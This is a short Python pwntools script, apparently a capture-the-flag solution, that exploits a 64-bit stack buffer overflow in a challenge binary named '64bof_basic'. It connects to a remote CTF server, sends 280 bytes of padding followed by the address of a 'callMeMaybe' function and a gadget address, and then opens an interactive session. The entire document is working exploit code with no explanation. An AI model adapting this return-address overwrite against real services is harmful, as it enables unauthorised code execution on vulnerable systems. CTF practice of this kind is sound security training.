from pwn import *

#context.log_level = 'DEBUG'

e = ELF("./64bof_basic")
#p = process("./64bof_basic")
r = remote("ctf.j0n9hyun.xyz", 3004)
offset = 280
pr_rdi = 0x400713
callMeMaybe = 0x400606

payload = ''
payload += "A"*offset
payload += p64(callMeMaybe)
payload += p64(pr_rdi)

r.sendline(payload)
r.interactive()
